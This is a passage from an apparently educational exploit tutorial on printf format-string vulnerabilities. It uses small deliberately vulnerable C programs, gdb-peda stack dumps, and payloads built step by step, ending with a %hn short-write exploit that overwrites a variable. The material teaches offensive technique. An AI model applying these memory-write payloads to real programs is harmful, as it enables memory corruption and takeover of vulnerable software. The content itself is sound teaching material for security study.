<span class="err">0096|</span> <span class="err">0</span><span class="nf">xbffff680</span> <span class="o">--&gt;</span> <span class="mh">0xb7fcb000</span> <span class="o">--&gt;</span> <span class="mh">0x1b2db0</span> 
<span class="err">0100|</span> <span class="err">0</span><span class="nf">xbffff684</span> <span class="o">--&gt;</span> <span class="mh">0xbffff764</span> <span class="o">--&gt;</span> <span class="mh">0xbffff886</span> <span class="p">(</span><span class="s">"/home/user/format0"</span><span class="p">)</span>
<span class="err">0104|</span> <span class="err">0</span><span class="nf">xbffff688</span> <span class="o">--&gt;</span> <span class="mh">0xb7ffed00</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="err">0108|</span> <span class="err">0</span><span class="nf">xbffff68c</span> <span class="o">--&gt;</span> <span class="mh">0x40000</span> 
<span class="err">0112|</span> <span class="err">0</span><span class="nf">xbffff690</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="err">0116|</span> <span class="err">0</span><span class="nf">xbffff694</span> <span class="o">--&gt;</span> <span class="mh">0x401a54</span> <span class="o">--&gt;</span> <span class="mh">0x1948</span> 
<span class="err">0120|</span> <span class="err">0</span><span class="nf">xbffff698</span> <span class="o">--&gt;</span> <span class="mh">0x1</span> 
<span class="err">0124|</span> <span class="err">0</span><span class="nf">xbffff69c</span> <span class="o">--&gt;</span> <span class="mh">0x4007bb</span> <span class="p">(</span><span class="o">&lt;</span><span class="nv">__libc_csu_init</span><span class="o">+</span><span class="mi">75</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="nb">edi</span><span class="p">,</span><span class="mh">0x1</span><span class="p">)</span>
<span class="err">0128|</span> <span class="err">0</span><span class="nf">xbffff6a0</span> <span class="o">--&gt;</span> <span class="mh">0x41410001</span> 
<span class="err">0132|</span> <span class="err">0</span><span class="nf">xbffff6a4</span> <span class="p">(</span><span class="s">"BBCCDD"</span><span class="p">)</span>
<span class="err">0136|</span> <span class="err">0</span><span class="nf">xbffff6a8</span> <span class="o">--&gt;</span> <span class="mh">0x4444</span> <span class="p">(</span><span class="s">'DD'</span><span class="p">)</span>
<span class="err">0140|</span> <span class="err">0</span><span class="nf">xbffff6ac</span> <span class="o">--&gt;</span> <span class="mh">0xbffff6a2</span> <span class="p">(</span><span class="s">"AABBCCDD"</span><span class="p">)</span> <span class="c1">; Here is the pointer</span>
<span class="err">0144|</span> <span class="err">0</span><span class="nf">xbffff6b0</span> <span class="o">--&gt;</span> <span class="mh">0xbffff6d0</span> <span class="o">--&gt;</span> <span class="mh">0x1</span> 
<span class="err">0148|</span> <span class="err">0</span><span class="nf">xbffff6b4</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="err">0152|</span> <span class="err">0</span><span class="nf">xbffff6b8</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
</code></pre></div></div>

<p>As you can see, the string pointer is at the offset <strong>35</strong>. If we want to read it, we have to enter the following string :</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@gdb:~<span class="nv">$ </span>./format0
%35<span class="nv">$s</span>
AABBCCDD does not have access!

user@gdb:~<span class="nv">$ </span>./format0
AABBCCDD
Good job <span class="o">!</span>
user@gdb:~<span class="nv">$ </span>
</code></pre></div></div>

<p>Easy, right ?</p>

<h2 id="writing-to-the-stack" class="active">Writing to the Stack<a class="header-link" href="https://axcheron.github.io/exploit-101-format-strings/#writing-to-the-stack" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p>Now you know how to read a specific argument on the stack, but we would like to go further and <strong>write</strong> on the stack ! Let’s take another example :</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
</span>
<span class="c1">// gcc -z execstack -z norelro -fno-stack-protector -o format1 format1.c</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">target</span> <span class="o">=</span> <span class="mh">0xdeadc0de</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>

    <span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>

    <span class="k">if</span><span class="p">(</span><span class="n">target</span> <span class="o">==</span> <span class="mh">0xcafebabe</span><span class="p">)</span> <span class="p">{</span>
      	<span class="n">printf</span><span class="p">(</span><span class="s">"Good job !</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
      	<span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
  	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
  	  	<span class="n">printf</span><span class="p">(</span><span class="s">"Nope...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  	  	<span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
  	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The goal here is to modify the <em>target</em> variable. It must be equal to <strong>0xcafebabe</strong>. To do that, there is another interesting format specifier: <strong>%n</strong>. According to the <em>printf()</em> man page, here is what <strong>%n</strong> should do :</p>

<p><em>The number of characters written so far is stored into the integer indicated by the int * (or variant) pointer argument. No argument is converted.</em></p>

<p>Hum, It’s a bit cryptic… Basically, it means that <strong>%n</strong> will write the <strong>size</strong> of our input at the address <em>pointed</em> by <strong>%n</strong>. For example, the following input : <strong>AAAA%n</strong>, means that we will write the value <em>4</em> (because the size of “AAAA” equals 4) at the address pointed by <strong>%n</strong>. But, where on the stack <strong>%n</strong> points to ?</p>

<p>Well, let’s try to submit <strong>AAAA%n</strong> into the program :</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// Check the pointer
<span class="nv">$ </span>./format1
AAAA.%p       
AAAA.0x40
Nope...

// Write 
<span class="nv">$ </span>./format1
AAAA.%n
Segmentation fault
</code></pre></div></div>

<p>Ooops, segfault… Why ? That’s because we try to write the value <strong>4</strong> (the size of our string) at the address <strong>0x40</strong> (the address pointed by <em>%n</em>) so, obviously it segfault…</p>

<p>To solve the challenge, you have to remember 2 things :</p>

<ul>
  <li>You <strong>control</strong> the input</li>
  <li>We can specify a <strong>postion</strong> to read/write on the stack with <code class="language-plaintext highlighter-rouge">%&lt;num&gt;$n</code></li>
</ul>

<p>So, instead of using a simple <strong>%n</strong>, we can use <code class="language-plaintext highlighter-rouge">%&lt;num&gt;$n</code> to specify the address to write to. What would happens if <code class="language-plaintext highlighter-rouge">%&lt;num&gt;$n</code> points to the start of our string ? Well, it will use the address specified in the beggining of our strings to write data to.</p>

<p>First, to write <strong>0xcafebabe</strong> in <em>target</em>, we have to find the <em>target</em> pointer on the stack.</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">[------------------------------------</span><span class="nf">stack</span><span class="o">-------------------------------------</span><span class="p">]</span>
<span class="err">0000|</span> <span class="err">0</span><span class="nf">xbffff650</span> <span class="o">--&gt;</span> <span class="mh">0xbffff66c</span> <span class="p">(</span><span class="err">"</span><span class="nv">AAAA</span><span class="err">\</span><span class="nv">n</span><span class="err">"</span><span class="p">)</span>
<span class="err">0004|</span> <span class="err">0</span><span class="nf">xbffff654</span> <span class="o">--&gt;</span> <span class="mh">0x40</span> <span class="p">(</span><span class="s">'@'</span><span class="p">)</span>
<span class="err">0008|</span> <span class="err">0</span><span class="nf">xbffff658</span> <span class="o">--&gt;</span> <span class="mh">0xb7fcb5a0</span> <span class="o">--&gt;</span> <span class="mh">0xfbad2288</span> 
<span class="err">0012|</span> <span class="err">0</span><span class="nf">xbffff65c</span> <span class="o">--&gt;</span> <span class="mh">0x400637</span> <span class="p">(</span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">23</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="nb">ebx</span><span class="p">,</span><span class="mh">0x1351</span><span class="p">)</span>
<span class="err">0016|</span> <span class="err">0</span><span class="nf">xbffff660</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="err">0020|</span> <span class="err">0</span><span class="nf">xbffff664</span> <span class="o">--&gt;</span> <span class="mh">0xbffff704</span> <span class="o">--&gt;</span> <span class="mh">0x7d074f84</span> 
<span class="err">0024|</span> <span class="err">0</span><span class="nf">xbffff668</span> <span class="o">--&gt;</span> <span class="mh">0xb7fcb000</span> <span class="o">--&gt;</span> <span class="mh">0x1b2db0</span> 
<span class="err">0028|</span> <span class="err">0</span><span class="nf">xbffff66c</span> <span class="p">(</span><span class="err">"</span><span class="nv">AAAA</span><span class="err">\</span><span class="nv">n</span><span class="s">")
0032| 0xbffff670 --&gt; 0xffff000a 
0036| 0xbffff674 --&gt; 0xb7fcb000 --&gt; 0x1b2db0 
0040| 0xbffff678 --&gt; 0xb7e24e18 --&gt; 0x2bb6 
0044| 0xbffff67c --&gt; 0xb7fd5858 --&gt; 0xb7e18000 --&gt; 0x464c457f 
0048| 0xbffff680 --&gt; 0xb7fcb000 --&gt; 0x1b2db0 
0052| 0xbffff684 --&gt; 0xbffff764 --&gt; 0xbffff885 ("</span><span class="o">/</span><span class="nv">home</span><span class="o">/</span><span class="nv">user</span><span class="o">/</span><span class="nv">format1</span><span class="err">"</span><span class="p">)</span>
<span class="err">0056|</span> <span class="err">0</span><span class="nf">xbffff688</span> <span class="o">--&gt;</span> <span class="mh">0xb7ffed00</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="err">0060|</span> <span class="err">0</span><span class="nf">xbffff68c</span> <span class="o">--&gt;</span> <span class="mh">0x40000</span> 
<span class="err">0064|</span> <span class="err">0</span><span class="nf">xbffff690</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="err">0068|</span> <span class="err">0</span><span class="nf">xbffff694</span> <span class="o">--&gt;</span> <span class="mh">0x401988</span> <span class="o">--&gt;</span> <span class="mh">0x187c</span> 
<span class="err">0072|</span> <span class="err">0</span><span class="nf">xbffff698</span> <span class="o">--&gt;</span> <span class="mh">0x1</span> 
<span class="err">0076|</span> <span class="err">0</span><span class="nf">xbffff69c</span> <span class="o">--&gt;</span> <span class="mh">0x40070b</span> <span class="p">(</span><span class="o">&lt;</span><span class="nv">__libc_csu_init</span><span class="o">+</span><span class="mi">75</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="nb">edi</span><span class="p">,</span><span class="mh">0x1</span><span class="p">)</span>
<span class="err">0080|</span> <span class="err">0</span><span class="nf">xbffff6a0</span> <span class="o">--&gt;</span> <span class="mh">0x1</span> 
<span class="err">0084|</span> <span class="err">0</span><span class="nf">xbffff6a4</span> <span class="o">--&gt;</span> <span class="mh">0xbffff764</span> <span class="o">--&gt;</span> <span class="mh">0xbffff885</span> <span class="p">(</span><span class="s">"/home/user/format1"</span><span class="p">)</span>
<span class="err">0088|</span> <span class="err">0</span><span class="nf">xbffff6a8</span> <span class="o">--&gt;</span> <span class="mh">0xbffff76c</span> <span class="o">--&gt;</span> <span class="mh">0xbffff898</span> <span class="p">(</span><span class="err">"</span><span class="nv">LS_COLORS</span><span class="err">=</span><span class="nv">rs</span><span class="err">=</span><span class="mi">0</span><span class="p">:</span><span class="nb">di</span><span class="err">=</span><span class="mi">01</span><span class="c1">;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc"...)</span>
<span class="err">0092|</span> <span class="err">0</span><span class="nf">xbffff6ac</span> <span class="o">--&gt;</span> <span class="mh">0xdeadc0de</span> <span class="c1">; Here is the pointer</span>
<span class="err">0096|</span> <span class="err">0</span><span class="nf">xbffff6b0</span> <span class="o">--&gt;</span> <span class="mh">0xbffff6d0</span> <span class="o">--&gt;</span> <span class="mh">0x1</span> 
<span class="err">0100|</span> <span class="err">0</span><span class="nf">xbffff6b4</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="err">0104|</span> <span class="err">0</span><span class="nf">xbffff6b8</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="err">0108|</span> <span class="err">0</span><span class="nf">xbffff6bc</span> <span class="o">--&gt;</span> <span class="mh">0xb7e30286</span> <span class="p">(</span><span class="o">&lt;</span><span class="nv">__libc_start_main</span><span class="o">+</span><span class="mi">246</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x10</span><span class="p">)</span>
<span class="err">0112|</span> <span class="err">0</span><span class="nf">xbffff6c0</span> <span class="o">--&gt;</span> <span class="mh">0x1</span> 
<span class="err">0116|</span> <span class="err">0</span><span class="nf">xbffff6c4</span> <span class="o">--&gt;</span> <span class="mh">0xb7fcb000</span> <span class="o">--&gt;</span> <span class="mh">0x1b2db0</span> 
<span class="err">[------------------------------------------------------------------------------]</span>
</code></pre></div></div>

<p>It seems that the <em>target</em> pointer is the 23rd argument on the stack <strong>0xbffff6ac</strong>. We want to replace the value at <strong>0xbffff6ac</strong>, but how do we specify this address ?</p>

<p>As I said earlier, if we can find the pointer to “AAAA”, we can replace <em>AAAA</em> by a specific address to write to. Just recheck the stack, you’ll see that “AAAA” is the <em>7th</em> argument.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./format1
AAAA%7<span class="nv">$p</span>
AAAA0x41414141
Nope...
</code></pre></div></div>

<p>So, the following input <code class="language-plaintext highlighter-rouge">\xac\xf6\xff\xbf%7$n</code> should write “4” at <strong>0xbffff6ac</strong>. Let’s me show you…</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">gdb</span><span class="o">-</span><span class="nv">peda$</span> <span class="nv">b</span> <span class="o">*</span><span class="mh">0x00400665</span> <span class="c1">; Break @printf()</span>
<span class="nf">Breakpoint</span> <span class="mi">1</span> <span class="nv">at</span> <span class="mh">0x400665</span>
<span class="nf">gdb</span><span class="o">-</span><span class="nv">peda$</span> <span class="nv">b</span> <span class="o">*</span><span class="mh">0x0040066a</span> <span class="c1">; Break right after printf()</span>
<span class="nf">Breakpoint</span> <span class="mi">2</span> <span class="nv">at</span> <span class="mh">0x40066a</span>
<span class="nf">gdb</span><span class="o">-</span><span class="nv">peda$</span> <span class="nv">run</span> <span class="o">&lt;</span> <span class="o">&lt;</span><span class="p">(</span><span class="nv">python</span> <span class="o">-</span><span class="nv">c</span> <span class="err">'</span><span class="nv">print</span> <span class="err">"\</span><span class="nv">xac</span><span class="err">\</span><span class="nv">xf6</span><span class="err">\</span><span class="nv">xff</span><span class="err">\</span><span class="nv">xbf</span><span class="s">" + "</span><span class="o">%</span><span class="mi">7</span><span class="kc">$</span><span class="nv">n</span><span class="err">"'</span><span class="p">)</span>
<span class="nf">Starting</span> <span class="nv">program</span><span class="p">:</span> <span class="o">/</span><span class="nv">home</span><span class="o">/</span><span class="nv">user</span><span class="o">/</span><span class="nv">format1</span> <span class="o">&lt;</span> <span class="o">&lt;</span><span class="p">(</span><span class="nv">python</span> <span class="o">-</span><span class="nv">c</span> <span class="err">'</span><span class="nv">print</span> <span class="err">"\</span><span class="nv">xac</span><span class="err">\</span><span class="nv">xf6</span><span class="err">\</span><span class="nv">xff</span><span class="err">\</span><span class="nv">xbf</span><span class="s">" + "</span><span class="o">%</span><span class="mi">7</span><span class="kc">$</span><span class="nv">n</span><span class="err">"'</span><span class="p">)</span>

<span class="err">[-------------------------------------</span><span class="nf">code</span><span class="o">-------------------------------------</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x40065e</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">62</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">sub</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0xc</span>
   <span class="err">0</span><span class="nf">x400661</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">65</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x4c</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x400664</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">68</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="nb">eax</span>
<span class="err">=&gt;</span> <span class="err">0</span><span class="nf">x400665</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">69</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x400450</span> <span class="o">&lt;</span><span class="nv">printf@plt</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x40066a</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">74</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x10</span>
   <span class="err">0</span><span class="nf">x40066d</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">77</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">cmp</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0xc</span><span class="p">],</span><span class="mh">0xcafebabe</span>
   <span class="err">0</span><span class="nf">x400674</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">84</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">jne</span>    <span class="mh">0x40068f</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">111</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x400676</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">86</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">sub</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0xc</span>

<span class="nf">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x00400665</span> <span class="nv">in</span> <span class="nv">main</span> <span class="p">()</span>
<span class="nf">gdb</span><span class="o">-</span><span class="nv">peda$</span> <span class="nv">x</span><span class="o">/</span><span class="nv">x</span> <span class="mh">0xbffff6ac</span> <span class="c1">; Check the value @ 0xbffff6ac</span>
<span class="err">0</span><span class="nl">xbffff6ac:</span>	<span class="err">0</span><span class="nf">xdeadc0de</span>
<span class="nf">gdb</span><span class="o">-</span><span class="nv">peda$</span> <span class="nv">continue</span>
<span class="nf">Continuing.</span>
<span class="nf">????</span>

<span class="err">[-------------------------------------</span><span class="nf">code</span><span class="o">-------------------------------------</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x400661</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">65</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x4c</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x400664</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">68</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="nb">eax</span>
   <span class="err">0</span><span class="nf">x400665</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">69</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x400450</span> <span class="o">&lt;</span><span class="nv">printf@plt</span><span class="o">&gt;</span>
<span class="err">=&gt;</span> <span class="err">0</span><span class="nf">x40066a</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">74</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x10</span>
   <span class="err">0</span><span class="nf">x40066d</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">77</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">cmp</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0xc</span><span class="p">],</span><span class="mh">0xcafebabe</span>
   <span class="err">0</span><span class="nf">x400674</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">84</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">jne</span>    <span class="mh">0x40068f</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">111</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x400676</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">86</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">sub</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0xc</span>
   <span class="err">0</span><span class="nf">x400679</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">89</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">ebx</span><span class="o">-</span><span class="mh">0x1248</span><span class="p">]</span>


<span class="nf">Breakpoint</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x0040066a</span> <span class="nv">in</span> <span class="nv">main</span> <span class="p">()</span>
<span class="nf">gdb</span><span class="o">-</span><span class="nv">peda$</span> <span class="nv">x</span><span class="o">/</span><span class="nv">x</span> <span class="mh">0xbffff6ac</span> <span class="c1">; Check the value @ 0xbffff6ac (again)</span>
<span class="err">0</span><span class="nl">xbffff6ac:</span>	<span class="err">0</span><span class="nf">x00000004</span>
</code></pre></div></div>

<p>Nice ! But we don’t want to write <em>4</em>, we want to write <strong>0xcafebabe</strong>. Here, we got 2 issues, first, if writing 4 chars as input means writing “4” at a specific address. Well, you’ll have to write 3405691582 (<em>0xcafebabe</em> in decimal) chars to write <strong>0xcafebabe</strong>… impossible !</p>

<p>But, here is a trick : <code class="language-plaintext highlighter-rouge">AAAA%&lt;value-4&gt;x%7$n</code> (it’s <em>value-4</em> because we already wrote 4 bytes, <em>AAAA</em>). For example, <code class="language-plaintext highlighter-rouge">AAAA%96x%7$n</code> will write the value <strong>100</strong> at the address <strong>0x41414141</strong>. Why ? Because <code class="language-plaintext highlighter-rouge">%100x</code> will print your agument padded with 100 bytes (FYI, it pads with “space”).</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./format1
%x
40
Nope...
<span class="nv">$ </span>./format1
%20x
                  40 <span class="c"># See the padding ?</span>
Nope...
</code></pre></div></div>

<p class="notice--warning"><strong>Watch Out !</strong> It’s <code class="language-plaintext highlighter-rouge">%&lt;Y&gt;x</code> <strong>NOT</strong> <code class="language-plaintext highlighter-rouge">%&lt;Y&gt;$x</code>. The first one will <strong>pad</strong> the <em>1st</em> argument with <em>Y</em> bytes. However, the second one will <strong>print</strong> the <em>Y</em>th argument.</p>

<p>The second issue is that you don’t want to do <code class="language-plaintext highlighter-rouge">AAAA%3405691578x%7$n</code>, because it will <strong>write</strong> a <em>3405691582</em> length pad on the standard output, it’ll take forever ! So, instead of writing a <em>long</em> integer (4 bytes), we’ll write 2 <em>short</em> integers (2 bytes). To do that, we’ll use another specifier : <strong>%hn</strong>.</p>

<p>Let’s break this down :</p>

<ul>
  <li>We want to write <strong>0xcafebabe</strong>. It means, <strong>0xcafe</strong> (51966 in decimal) in the high order bytes and <strong>0xbabe</strong> (47806 in decimal) in the low order bytes.</li>
  <li>We want to write those value at <strong>0xbffff6ac</strong>. It means writing <strong>0xcafe</strong> at <strong>0xbffff6ac + 2</strong> = <strong>0xbffff6ae</strong> (high order) and <strong>0xbabe</strong> at <strong>0xbffff6ac</strong> (low order).</li>
</ul>

<p>Now, we have to figure out the value to set for the padding. Here is the formula :</p>

<p><strong>[The value we want] - [The bytes alredy wrote] = [The value to set]</strong>.</p>

<p>Let’s start with the <em>low order</em> bytes :</p>

<p>It’ll will be <em>47806 - 8 = 47798</em>, because we already wrote <strong>8</strong> bytes (the two <strong>4</strong> bytes addresses).</p>

<p>Then, the <em>high order</em> bytes :</p>

<p>It’ll will be <em>51966 - 47806 = 4160</em>, because we already wrote <strong>47806</strong> bytes (the two <strong>4</strong> bytes addresses and <strong>47798</strong> bytes from the previous writing).</p>

<p>Now we can construct the exploit :</p>

<p>It’ll be : <code class="language-plaintext highlighter-rouge">\xac\xf6\xff\xbf\xae\xf6\xff\xbf%47798x%7$hn%4160x%8$hn</code>. Let me explain :</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">\xac\xf6\xff\xbf</code> or <strong>0xbffff6ac</strong> (in reverse order) points to the low order bytes.</li>
  <li><code class="language-plaintext highlighter-rouge">\xae\xf6\xff\xbf</code> or <strong>0xbffff6ae</strong> (in reverse order) points to the high order bytes.</li>
  <li><code class="language-plaintext highlighter-rouge">%47798x</code> will write <em>47798</em> bytes on the standard output.</li>
  <li><code class="language-plaintext highlighter-rouge">%7$hn</code> will write <em>8 + 47798 = 47806</em> bytes (or <em>0xbabe</em>) at the first address specified (<strong>0xbffff6ac</strong>).</li>
  <li><code class="language-plaintext highlighter-rouge">%4160x</code> will write <em>4160</em> bytes on the standard output.</li>
  <li><code class="language-plaintext highlighter-rouge">%8$hn</code> will write <em>8 + 47798 + 4160 = 51966</em> (or <em>0xcafe</em>) at the second address specified (<strong>0xbffff6ae</strong>).</li>
</ul>

<p>Let’s try that in GDB.</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">gdb</span><span class="o">-</span><span class="nv">peda$</span> <span class="nv">b</span> <span class="o">*</span><span class="mh">0x00400665</span> <span class="c1">; Break @printf()</span>
<span class="nf">Breakpoint</span> <span class="mi">1</span> <span class="nv">at</span> <span class="mh">0x400665</span>
<span class="nf">gdb</span><span class="o">-</span><span class="nv">peda$</span> <span class="nv">b</span> <span class="o">*</span><span class="mh">0x0040066a</span> <span class="c1">; Break right after printf()</span>
<span class="nf">Breakpoint</span> <span class="mi">2</span> <span class="nv">at</span> <span class="mh">0x40066a</span>
<span class="nf">gdb</span><span class="o">-</span><span class="nv">peda$</span> <span class="nv">run</span> <span class="o">&lt;</span> <span class="o">&lt;</span><span class="p">(</span><span class="nv">python</span> <span class="o">-</span><span class="nv">c</span> <span class="err">'</span><span class="nv">print</span> <span class="err">"\</span><span class="nv">xac</span><span class="err">\</span><span class="nv">xf6</span><span class="err">\</span><span class="nv">xff</span><span class="err">\</span><span class="nv">xbf</span><span class="err">\</span><span class="nv">xae</span><span class="err">\</span><span class="nv">xf6</span><span class="err">\</span><span class="nv">xff</span><span class="err">\</span><span class="nv">xbf</span><span class="o">%</span><span class="mi">47798</span><span class="nv">x</span><span class="o">%</span><span class="mi">7</span><span class="kc">$</span><span class="nv">hn</span><span class="o">%</span><span class="mi">4160</span><span class="nv">x</span><span class="o">%</span><span class="mi">8</span><span class="kc">$</span><span class="nv">hn</span><span class="err">"'</span><span class="p">)</span>
<span class="nf">Starting</span> <span class="nv">program</span><span class="p">:</span> <span class="o">/</span><span class="nv">home</span><span class="o">/</span><span class="nv">user</span><span class="o">/</span><span class="nv">format1</span> <span class="o">&lt;</span> <span class="o">&lt;</span><span class="p">(</span><span class="nv">python</span> <span class="o">-</span><span class="nv">c</span> <span class="err">'</span><span class="nv">print</span> <span class="err">"\</span><span class="nv">xac</span><span class="err">\</span><span class="nv">xf6</span><span class="err">\</span><span class="nv">xff</span><span class="err">\</span><span class="nv">xbf</span><span class="err">\</span><span class="nv">xae</span><span class="err">\</span><span class="nv">xf6</span><span class="err">\</span><span class="nv">xff</span><span class="err">\</span><span class="nv">xbf</span><span class="o">%</span><span class="mi">47798</span><span class="nv">x</span><span class="o">%</span><span class="mi">7</span><span class="kc">$</span><span class="nv">hn</span><span class="o">%</span><span class="mi">4160</span><span class="nv">x</span><span class="o">%</span><span class="mi">8</span><span class="kc">$</span><span class="nv">hn</span><span class="err">"'</span><span class="p">)</span>

<span class="nf">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x00400665</span> <span class="nv">in</span> <span class="nv">main</span> <span class="p">()</span>
<span class="nf">gdb</span><span class="o">-</span><span class="nv">peda$</span> <span class="nv">x</span><span class="o">/</span><span class="nv">x</span> <span class="mh">0xbffff6ac</span>
<span class="err">0</span><span class="nl">xbffff6ac:</span>	<span class="err">0</span><span class="nf">xdeadc0de</span> <span class="c1">; Before printf()</span>
<span class="nf">gdb</span><span class="o">-</span><span class="nv">peda$</span> <span class="nv">conti</span>
<span class="nf">Continuing.</span>
<span class="nf">????????</span>   

<span class="nf">Breakpoint</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x0040066a</span> <span class="nv">in</span> <span class="nv">main</span> <span class="p">()</span>
<span class="nf">gdb</span><span class="o">-</span><span class="nv">peda$</span> <span class="nv">x</span><span class="o">/</span><span class="nv">x</span> <span class="mh">0xbffff6ac</span>
<span class="err">0</span><span class="nl">xbffff6ac:</span>	<span class="err">0</span><span class="nf">xcafebabe</span> <span class="c1">; After printf()          </span>

